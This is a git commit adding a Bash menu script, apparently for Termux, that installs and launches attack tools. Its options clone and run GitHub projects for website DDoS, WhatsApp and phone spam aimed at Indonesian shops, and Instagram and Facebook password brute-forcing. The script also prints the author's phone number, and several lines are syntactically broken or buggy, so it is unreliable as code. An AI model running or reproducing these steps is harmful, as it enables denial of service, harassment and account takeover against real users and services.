9cd556249f5487b2df5c9876bc701a696a0eaf84
TuanEmoN <46201172+TuanEmoN@users.noreply.github.com>
2018-12-28 09:22:52 +0700

    Add files via upload

---
+++ test.sh
@@ -0,0 +1,135 @@
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+
+
+echo $green"[author   ]:Mr. EmoN"
+echo $red"[type    ]:tools instaler"
+echo $yellow"[team   ]:CyberLayersTeam"
+echo $white"[contact me   ]:081799585663"
+echo $purple"[Thanks to all members]"
+echo $yellow"[CyberLayersTeam]"
+echo $cyan"[youtube channel  ]:CyberLayersTeam"
+echo $grenn"[special Thanks]:XZ3PRO,nyai annah and swityweber""
+echo ""
+echo $white"Welcome..:::...Bermimpilah setinggi langit jika kamu jatuh berarti tidurmu kurang tengah:v
+echo "[+]========================================[+]"
+echo $white"|  [1] DDOS Website Dengan LITEDDOS"
+echo "[+]========================================[+]"
+echo $red"|  [2] SPAM WA Bukalapak"
+echo "[+]========================================[+]"
+echo $yellow"|  [3] PRANK DI TELFON TOKOPEDIA"
+echo "[+]========================================[+]"
+echo $green"|  [4] HACK INSTAGRAM"
+echo "[+]========================================[+]"
+echo $purple"|  [5] HACK FB MBF"
+echo "[+]========================================[+]"
+echo $blue"|  [6] DDOS Website Dengan Hammer"
+echo "[+]========================================[+]"
+echo ">>>>>"
+read -p "=>[pilih nomer]
+√°°root@Mr.EmoN=°>" bro
+
+
+if [ $bro = 1 ] || [ $bro = 1 ]
+then
+clear
+echo
+toilet -f standard " *Mr. EmoN* " -F gay
+echo
+echo "Install LITEDDOS"
+sleep 1
+apt update
+apt install git
+git clone https://github.com/4L13199/LITEDDOS
+mv LITEDDOS $HOME
+cd $HOME/LITEDDOS
+read -p "masukanTarget:" target
+python2 LITEDDOS.py target 80 100
+fi
+
+if [ $bro = 2 ] || [ $bro = 2 ]
+then
+clear
+echo
+toilet -f standard " Mr. EmoN " -F gay
+echo
+echo ""
+echo $green"SPAM WA Bukalapak"
+sleep 1
+apt update
+apt upgrade
+apt install php
+apt install git
+git clone https://github.com/siputra12/prank
+mv prank $HOME
+cd $HOME/prank
+read -p "masukanTarget:" target
+read -p "masukanInput:" Input
+php wa.php
+fi
+
+if [ $bro = 3 ] || [ $bro = 3 ]
+then
+clear
+echo
+toilet -f  standard " Mr. EmoN " -F gay
+echo
+echo ""
+echo $yellow"PRANK DI TELFON TOKOPEDIA"
+sleep 1
+apt update
+apt upgrade
+pkg install php
+pkg install git
+git clone https://github.com/siputra12/prank
+mv prank $HOME
+cd $HOME/prank
+read -p "masukanTarget:" target
+php wa.php
+fi
+
+if [ $bro = 4 ] || [ $bro = 4 ]
+then
+clear
+echo
+toilet -f standard "Mr.  EmoN" -F gay
+echo
+echo ""
+echo $green"HACK INSTAGRAM"
+sleep 1
+apt update
+apt upgrade
+pkg install python
+pkg install nano
+pkg install git
+git clone https://github.com/avramit/instahack.git
+mv instahack.git $HOME
+cd $HOME/instahack
+nano pass.txt
+fi
+
+
+if [ $bro = 5 ] || [ $bro = 5 ]
+then
+clear
+echo
+toilet -f standard " Mr.   EmoN " -F gay
+echo
+echo ""
+echo $purple"HACK FB MBF"
+sleep 1
+apt update
+apt upgrade
+pkg install php
+pkg install git
+pkg install python2
+git clone https://github.com/hnov7/MBF
+mv MBF $HOME
+cd $HOME/MBF
+python2 mbf.py
+fi
